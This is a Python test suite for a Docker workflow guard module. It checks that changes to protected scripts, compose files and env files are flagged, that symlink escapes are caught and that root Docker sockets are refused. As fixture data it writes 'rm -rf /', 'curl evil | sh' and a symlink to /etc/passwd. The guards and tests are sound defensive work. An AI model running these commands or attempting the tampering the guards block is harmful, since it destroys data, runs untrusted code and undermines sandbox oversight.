"""Tests for claude_workflow.docker_stack (no real docker is ever called)."""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from claude_workflow.config import DEFAULT_PROTECTED_PATHS, DockerConfig
from claude_workflow.docker_stack import (
    base_script_copy,
    compose_env,
    compose_model,
    docker_env,
    guard_patterns,
    guard_violations,
    override_path,
    port_hint,
    prepare_worktree,
    require_rootless,
    run_command,
    socket_override,
    symlink_violations,
    up_command,
    write_override,
)


HOST = "unix:///var/lib/cw-docker-sock/docker.sock"


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _make_repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "wt"
    repo.mkdir()
    _git(repo, "init")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "T")
    (repo / ".gitignore").write_text(".env\nnginx-proxy/certs\nlegacy/docker/cache\n")
    (repo / "test_runner.sh").write_text("echo hi\n")
    (repo / "legacy/docker/legacy-web").mkdir(parents=True)
    (repo / "legacy/docker/legacy-web/legacy-web.Dockerfile").write_text("FROM x\n")
    (repo / "nginx-proxy").mkdir()
    (repo / "nginx-proxy/nginx.conf").write_text("x\n")
    (repo / "legacy/src").mkdir(parents=True)
    (repo / "legacy/src/Foo.php").write_text("<?php\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "base")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    return repo, base


def test_guard_flags_changed_test_runner(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").write_text("rm -rf /\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["test_runner.sh"]


def test_guard_flags_ignored_env_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / ".env").write_text("A=1\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == [".env"]


def test_guard_flags_dockerfile_in_subfolder(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/docker/legacy-web/legacy-web.Dockerfile").write_text("FROM evil\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == [
        "legacy/docker/legacy-web/legacy-web.Dockerfile"
    ]


def test_guard_flags_ignored_directory(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/docker/cache").mkdir()
    (repo / "legacy/docker/cache/x").write_text("x")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["legacy/docker/cache"]


def test_guard_ignores_normal_code(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/src/Foo.php").write_text("<?php // changed\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == []


def test_guard_skips_host_copies(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.key").write_text("secret")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["nginx-proxy/certs"]
    assert (
        guard_violations(
            repo, base, DEFAULT_PROTECTED_PATHS, host_copies=("nginx-proxy/certs",)
        )
        == []
    )


def test_compose_env_uses_main_env_file_not_worktree(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs")
    assert "COMPOSE_ENV_FILES" not in compose_env(cfg, wt, repo, HOST)
    assert "--env-file" not in up_command(cfg, wt, repo)
    (repo / ".env").write_text("A=1\n")
    env = compose_env(cfg, wt, repo, HOST)
    assert env["COMPOSE_ENV_FILES"] == str(repo / ".env")
    assert env["COMPOSE_PROJECT_NAME"] == "dfs"
    assert env["COMPOSE_FILE"] == str(wt / "docker-compose.yml")
    assert env["COMPOSE_PROFILES"] == "dyflexis"
    cmd = up_command(cfg, wt, repo)
    assert cmd[cmd.index("--env-file") + 1] == str(repo / ".env")
    assert cmd[-5:] == ["up", "-d", "--wait", "--wait-timeout", "900"]
    assert cmd[:2] == ["docker", "compose"]


def test_prepare_worktree_replaces_host_copy_and_creates_dirs(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.crt").write_text("ca")
    (wt / "nginx-proxy/certs").mkdir(parents=True)
    (wt / "nginx-proxy/certs/x").write_text("stale")
    cfg = DockerConfig(
        project_name="dfs", host_copies=("nginx-proxy/certs",), create_dirs=("legacy/cache",)
    )
    prepare_worktree(cfg, wt, repo)
    assert sorted(p.name for p in (wt / "nginx-proxy/certs").iterdir()) == ["ca.crt"]
    assert (wt / "legacy/cache").is_dir()


def test_prepare_worktree_refuses_symlinked_target(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (wt / "nginx-proxy").mkdir(parents=True)
    (wt / "elsewhere").mkdir()
    (wt / "nginx-proxy/certs").symlink_to(wt / "elsewhere")
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    with pytest.raises(ValueError):
        prepare_worktree(cfg, wt, repo)


def test_prepare_worktree_refuses_symlinked_source(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy").mkdir(parents=True)
    (repo / "real").mkdir()
    (repo / "nginx-proxy/certs").symlink_to(repo / "real")
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    with pytest.raises(ValueError):
        prepare_worktree(cfg, wt, repo)


def test_base_script_copy_writes_base_blob_outside_worktree(tmp_path: Path) -> None:
    wt, base = _make_repo(tmp_path)
    (wt / "test_runner.sh").write_text("curl evil | sh\n")
    dest = tmp_path / "out"
    dest.mkdir()

    copy = base_script_copy(wt, base, "test_runner.sh", dest)

    assert copy.parent == dest
    assert copy.read_text() == "echo hi\n"


def test_base_script_copy_missing_in_base_raises(tmp_path: Path) -> None:
    wt, base = _make_repo(tmp_path)

    with pytest.raises(ValueError):
        base_script_copy(wt, base, "nope.sh", tmp_path)


def test_run_command_statuses() -> None:
    ok = MagicMock(returncode=0, stdout="out\n", stderr="err\n")
    with patch("claude_workflow.docker_stack.subprocess.run", return_value=ok) as run:
        assert run_command(["x"], cwd=None, env=None, timeout=5) == ("PASS", "out\nerr")
        assert run.call_args.kwargs["timeout"] == 5
    bad = MagicMock(returncode=2, stdout="", stderr="")
    with patch("claude_workflow.docker_stack.subprocess.run", return_value=bad):
        assert run_command(["x"], cwd=None, env=None, timeout=5)[0] == "FAIL (exit 2)"
    with patch(
        "claude_workflow.docker_stack.subprocess.run",
        side_effect=subprocess.TimeoutExpired("x", 5),
    ):
        assert run_command(["x"], cwd=None, env=None, timeout=5) == (
            "FAIL (timeout after 5s)",
            "",
        )


def test_guard_flags_crlf_rewrite_hidden_by_gitattributes(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / ".gitattributes").write_text("* text eol=lf\n")
    (repo / "test_runner.sh").write_bytes(b"echo hi\r\n")
    # git itself normalises the line endings, so a plain diff sees no change
    plain = subprocess.run(
        ["git", "diff", base, "--name-only"], cwd=repo, capture_output=True, text=True
    ).stdout
    assert "test_runner.sh" not in plain
    flagged = guard_violations(repo, base, DEFAULT_PROTECTED_PATHS)
    assert "test_runner.sh" in flagged
    assert ".gitattributes" in flagged


def test_guard_flags_deleted_protected_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").unlink()
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["test_runner.sh"]


def test_guard_flags_symlink_replacing_protected_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").unlink()
    (repo / "test_runner.sh").symlink_to("legacy/src/Foo.php")
    assert "test_runner.sh" in guard_violations(repo, base, DEFAULT_PROTECTED_PATHS)


def test_guard_clean_when_nothing_changed(
    tmp_path: Path,
) -> None:
    repo, base = _make_repo(tmp_path)
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == []


def test_guard_patterns_always_include_host_scripts_and_compose(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "bin").mkdir()
    (repo / "bin/run.sh").write_text("echo\n")
    (repo / "docker-compose.yml").write_text("services: {}\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "more")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    cfg = DockerConfig(project_name="x", protected_paths=())
    patterns = guard_patterns(cfg, ("bin/run.sh",))
    assert "test_runner.sh" not in patterns  # only what the caller names
    assert "bin/run.sh" in patterns and "docker-compose.yml" in patterns
    assert guard_violations(repo, base, patterns) == []
    (repo / "bin/run.sh").write_text("evil\n")
    (repo / "docker-compose.yml").write_text("evil\n")
    assert guard_violations(repo, base, patterns) == ["bin/run.sh", "docker-compose.yml"]


def test_prepare_worktree_replaces_plain_file_target(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.crt").write_text("ca")
    (wt / "nginx-proxy").mkdir(parents=True)
    (wt / "nginx-proxy/certs").write_text("a file, not a folder")
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    prepare_worktree(cfg, wt, repo)
    assert (wt / "nginx-proxy/certs/ca.crt").read_text() == "ca"


def test_prepare_worktree_copy_error_is_clear_value_error(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    error = shutil.Error([("a.key", "b.key", "Permission denied")])
    with (
        patch("claude_workflow.docker_stack.shutil.copytree", side_effect=error),
        pytest.raises(ValueError, match="could not copy nginx-proxy/certs"),
    ):
        prepare_worktree(cfg, wt, repo)


def test_base_script_copy_refuses_symlink_in_base(tmp_path: Path) -> None:
    wt, _ = _make_repo(tmp_path)
    (wt / "link.sh").symlink_to("test_runner.sh")
    _git(wt, "add", ".")
    _git(wt, "commit", "-m", "link")
    dest = tmp_path / "out"
    dest.mkdir()

    with pytest.raises(ValueError, match="regular file"):
        base_script_copy(wt, "HEAD", "link.sh", dest)
    assert list(dest.iterdir()) == []


def test_prepare_worktree_copies_only_included_files(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    certs = repo / "nginx-proxy/certs"
    certs.mkdir(parents=True)
    (certs / "a.crt").write_text("crt")
    (certs / "a.key").write_text("secret")
    (certs / "dhparam.pem").write_text("dh")
    (certs / "link.crt").symlink_to("/etc/passwd")
    wt.mkdir()
    cfg = DockerConfig(
        project_name="dfs",
        host_copies=("nginx-proxy/certs",),
        host_copy_includes=(("nginx-proxy/certs", ("*.crt",)),),
    )

    prepare_worktree(cfg, wt, repo)

    assert sorted(p.name for p in (wt / "nginx-proxy/certs").iterdir()) == ["a.crt"]


def test_up_command_appends_services(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", services=("db", "redis"))
    assert up_command(cfg, wt, repo)[-5:] == ["--wait", "--wait-timeout", "900", "db", "redis"]
    assert up_command(cfg, wt, repo)[-2:] == ["db", "redis"]
    assert up_command(DockerConfig(project_name="dfs"), wt, repo)[-1] == "900"


# --- symlinks (a symlinked bind-mount source would make root Docker mount its target) --


def test_symlinks_flag_tracked_dir_replaced_by_symlink(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    shutil.rmtree(repo / "legacy/src")
    (repo / "legacy/src").symlink_to(outside)
    assert symlink_violations(repo, base) == ["legacy/src"]


def test_symlinks_flag_ignored_dir_that_is_a_symlink(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    (repo / "legacy/docker/cache").symlink_to(outside)
    assert symlink_violations(repo, base) == ["legacy/docker/cache"]


def test_symlinks_flag_symlinked_parent_of_a_listed_path(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    (outside / "new.txt").write_text("x")
    (repo / "data").symlink_to(outside)
    # git itself never lists files behind a symlink; the parent check must still hold.
    with (
        patch("claude_workflow.docker_stack.touched_paths", return_value=["data/new.txt"]),
        patch("claude_workflow.docker_stack.ignored_paths", return_value=[]),
    ):
        assert symlink_violations(repo, base) == ["data"]


def test_symlinks_allow_identical_symlink_from_base(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "link").symlink_to("legacy/src")
    _git(repo, "add", "link")
    _git(repo, "commit", "-m", "link")
    base2 = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    with patch(
        "claude_workflow.docker_stack.touched_paths", return_value=["link/Foo.php", "link"]
    ):
        assert symlink_violations(repo, base2) == []
    # Same path, other target: flagged.
    (repo / "link").unlink()
    (repo / "link").symlink_to(tmp_path)
    assert symlink_violations(repo, base2) == ["link"]


def test_symlinks_skip_paths_inside_host_copies(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "nginx-proxy/certs").mkdir()
    (repo / "nginx-proxy/certs/a.crt").symlink_to(tmp_path)
    with patch(
        "claude_workflow.docker_stack.ignored_paths",
        return_value=["nginx-proxy/certs/a.crt"],
    ):
        assert symlink_violations(repo, base) == ["nginx-proxy/certs/a.crt"]
        # The host replaces everything under a host-copies entry before `up`.
        assert symlink_violations(repo, base, host_copies=("nginx-proxy/certs",)) == []
    # The entry itself is still checked.
    shutil.rmtree(repo / "nginx-proxy/certs")
    (repo / "nginx-proxy/certs").symlink_to(tmp_path)
    assert symlink_violations(repo, base, host_copies=("nginx-proxy/certs",)) == [
        "nginx-proxy/certs"
    ]


def test_symlinks_clean_repo(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/src/Bar.php").write_text("<?php\n")
    assert symlink_violations(repo, base) == []


def test_run_command_reports_start_errors(tmp_path: Path) -> None:
    missing = run_command([str(tmp_path / "no-such-tool")], cwd=None, env=None, timeout=5)
    assert missing[0].startswith("FAIL (could not start: ")
    assert "No such file" in missing[0]
    assert missing[1] == ""
    noexec = tmp_path / "script"
    noexec.write_bytes(b"\x00\x01garbage")
    noexec.chmod(0o755)
    status, output = run_command([str(noexec)], cwd=None, env=None, timeout=5)
    assert status.startswith("FAIL (could not start: ") and output == ""
    gone = run_command(["true"], cwd=tmp_path / "gone", env=None, timeout=5)
    assert gone[0].startswith("FAIL (could not start: ")


def test_require_rootless_returns_host() -> None:
    assert require_rootless(HOST, Path("/srv/w")) == HOST


def test_require_rootless_refuses_missing_host() -> None:
    with pytest.raises(ValueError, match="docker-host"):
        require_rootless(None, Path("/srv/w"))


def test_inherited_docker_host_does_not_count_as_rootless(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCKER_HOST", HOST)
    with pytest.raises(ValueError, match="docker-host"):
        require_rootless(None, Path("/srv/w"))


@pytest.mark.parametrize("uri", ["unix:///var/run/docker.sock", "unix:///run/docker.sock"])
def test_require_rootless_refuses_root_socket(uri: str) -> None:
    with pytest.raises(ValueError, match="root Docker"):
        require_rootless(uri, Path("/srv/w"))


def test_require_rootless_refuses_symlink_to_root_socket(tmp_path: Path) -> None:
    link = tmp_path / "s"
    link.symlink_to("/var/run/docker.sock")
    with pytest.raises(ValueError, match="root Docker"):
        require_rootless(f"unix://{link}", Path("/srv/w"))


@pytest.mark.parametrize("uri", ["tcp://127.0.0.1:2375", "unix://relative.sock", "/x/d.sock"])
def test_require_rootless_refuses_non_unix_uri(uri: str) -> None:
    with pytest.raises(ValueError, match="unix://"):
        require_rootless(uri, Path("/srv/w"))


def test_require_rootless_refuses_worktree_base_in_home() -> None:
    with pytest.raises(ValueError, match="cw-docker can't read"):
        require_rootless(HOST, Path.home() / "wt")


def test_docker_env_overrides_inherited(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    assert docker_env("unix:///x/d.sock")["DOCKER_HOST"] == "unix:///x/d.sock"


def test_compose_env_sets_docker_host_and_override(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    cfg = DockerConfig(project_name="dfs")
    env = compose_env(cfg, wt, repo, HOST)
    assert env["DOCKER_HOST"] == HOST
    assert env["COMPOSE_FILE"] == f"{wt}/docker-compose.yml"
    override = tmp_path / "override.yml"
    env = compose_env(cfg, wt, repo, HOST, override=override)
    assert env["COMPOSE_FILE"] == f"{wt}/docker-compose.yml:{override}"


# --- compose override for docker.sock mounts ------------------------------------------

SOCK = "/var/lib/cw-docker-sock/docker.sock"
MODEL: dict[str, Any] = {
    "services": {
        "proxy": {
            "volumes": [
                {
                    "type": "bind",
                    "source": "/var/run/docker.sock",
                    "target": "/tmp/docker.sock",
                    "read_only": True,
                },
                {"type": "bind", "source": "/w/nginx-proxy/certs", "target": "/etc/nginx/certs"},
            ]
        },
        "db": {"volumes": [{"type": "volume", "source": "db", "target": "/var/lib/mysql"}]},
    }
}


def test_socket_override_repoints_only_socket_mounts() -> None:
    assert socket_override(MODEL, SOCK) == {
        "services": {
            "proxy": {
                "volumes": [
                    {
                        "type": "bind",
                        "source": SOCK,
                        "target": "/tmp/docker.sock",
                        "read_only": True,
                    }
                ]
            }
        }
    }


def test_socket_override_also_matches_run_docker_sock() -> None:
    model = {
        "services": {
            "c": {"volumes": [{"type": "bind", "source": "/run/docker.sock", "target": "/s"}]}
        }
    }
    assert socket_override(model, SOCK)["services"]["c"]["volumes"][0]["source"] == SOCK


def test_socket_override_without_socket_mounts_is_empty() -> None:
    assert socket_override({"services": {"db": {}}}, "/s") == {"services": {}}
    assert socket_override({}, "/s") == {"services": {}}


def test_up_command_adds_override_file(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    argv = up_command(DockerConfig(project_name="dfs"), wt, repo, override=tmp_path / "o.json")
    i = argv.index(str(wt / "docker-compose.yml"))
    assert argv[i + 1 : i + 3] == ["--file", str(tmp_path / "o.json")]


def test_override_path_is_under_state_base_compose(tmp_path: Path) -> None:
    path = override_path(tmp_path / "state", DockerConfig(project_name="dfs"))
    assert path == tmp_path / "state" / "compose" / "dfs.override.json"


def test_write_override_creates_parent_and_json(tmp_path: Path) -> None:
    path = tmp_path / "a" / "compose" / "x.override.json"
    write_override(path, {"services": {}})
    assert json.loads(path.read_text()) == {"services": {}}


def test_port_hint() -> None:
    out = "Bind for 0.0.0.0:80 failed: address already in use"
    assert "stop your dev stack" in port_hint(out)
    assert port_hint("other error") == "other error"


def _fake_compose(status: str, output: str) -> Any:
    calls: list[dict[str, Any]] = []

    def fake(
        argv: list[str], *, cwd: Path | None, env: dict[str, str] | None, timeout: int
    ) -> tuple[str, str]:
        calls.append({"argv": argv, "env": env})
        return status, output

    return fake, calls


def test_compose_model_parses_json_with_warnings_and_uses_rootless_env(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    fake, calls = _fake_compose("PASS", 'WARN[0000] unset var\n{"services": {"a": {}}}\nWARN x')
    with patch("claude_workflow.docker_stack.run_command", fake):
        model = compose_model(DockerConfig(project_name="dfs"), wt, repo, HOST)
    assert model == {"services": {"a": {}}}
    assert calls[0]["argv"][-3:] == ["config", "--format", "json"]
    assert calls[0]["env"]["DOCKER_HOST"] == HOST


@pytest.mark.parametrize(
    ("status", "output"), [("FAIL (exit 1)", "boom"), ("PASS", "not json"), ("PASS", "{broken")]
)
def test_compose_model_raises_on_failure_or_bad_json(
    tmp_path: Path, status: str, output: str
) -> None:
    fake, _ = _fake_compose(status, output)
    with patch("claude_workflow.docker_stack.run_command", fake), pytest.raises(ValueError):
        compose_model(DockerConfig(project_name="dfs"), tmp_path, tmp_path, HOST)
